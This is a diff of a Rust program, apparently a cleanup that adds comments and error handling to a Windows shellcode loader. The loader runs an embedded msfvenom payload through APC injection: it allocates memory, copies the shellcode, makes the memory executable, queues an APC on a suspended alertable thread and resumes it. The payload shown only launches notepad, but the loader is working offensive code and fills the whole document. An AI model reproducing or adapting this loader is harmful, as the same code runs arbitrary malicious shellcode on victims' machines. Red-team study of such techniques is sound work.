@@ -2,16 +2,18 @@ use std::{
     ffi::c_void,
     ptr::copy_nonoverlapping,
 };
+use windows::core::Result;
 use windows::Win32::System::Memory::{
-    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+    VirtualAlloc, VirtualProtect, MEM_COMMIT, 
+    MEM_RESERVE, PAGE_EXECUTE_READWRITE,
     PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
 };
 use windows::Win32::System::Threading::{
-    CreateThread, QueueUserAPC, ResumeThread, SleepEx, WaitForSingleObject, INFINITE,
-    THREAD_CREATION_FLAGS,
+    CreateThread, QueueUserAPC, ResumeThread, SleepEx, 
+    WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS,
 };
 
-fn main() {
+fn main() -> Result<()> {
     // msfvenom -p windows/x64/exec CMD=notepad.exe -f rust
     let buf: [u8; 279] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -34,7 +36,9 @@ fn main() {
         0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x6e, 0x6f, 0x74,
         0x65, 0x70, 0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
+
     unsafe {
+        // Create a suspended thread that will be used to execute the payload.
         let hthread = CreateThread(
             None,
             0,
@@ -42,32 +46,31 @@ fn main() {
             None,
             THREAD_CREATION_FLAGS(0),
             None,
-        ).unwrap_or_else(|e| panic!("[!] CreateThread Failed With Error: {e}"));
+        )?;
 
-        let address = VirtualAlloc(
-            None,
-            buf.len(),
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
-        );
+        // Allocate RW memory to hold the shellcode
+        let address = VirtualAlloc(None, buf.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-        copy_nonoverlapping(buf.as_ptr() as _, address, buf.len());
+        // Copy the shellcode into the allocated memory
+        copy_nonoverlapping(buf.as_ptr().cast(), address, buf.len());
 
+        // Change memory permissions to RX so the shellcode can be executed
         let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
-        VirtualProtect(address, buf.len(), PAGE_EXECUTE_READWRITE, &mut oldprotect).unwrap_or_else(|e| {
-            panic!("[!] VirtualProtect Failed With Error: {e}");
-        });
+        VirtualProtect(address, buf.len(), PAGE_EXECUTE_READWRITE, &mut oldprotect)?;
 
+        // Queue the shellcode for execution as an APC in the thread's context.
         QueueUserAPC(Some(std::mem::transmute(address)), hthread, 0);
 
+        // Resume the thread, which will execute the shellcode via the queued APC.
         ResumeThread(hthread);
-
         WaitForSingleObject(hthread, INFINITE);
     }
+
+    Ok(())
 }
 
+/// Dummy thread entry function that blocks on `SleepEx`, waiting for an APC to trigger.
 unsafe extern "system" fn function(_param: *mut c_void) -> u32 {
     SleepEx(INFINITE, true);
-
     return 0;
 }
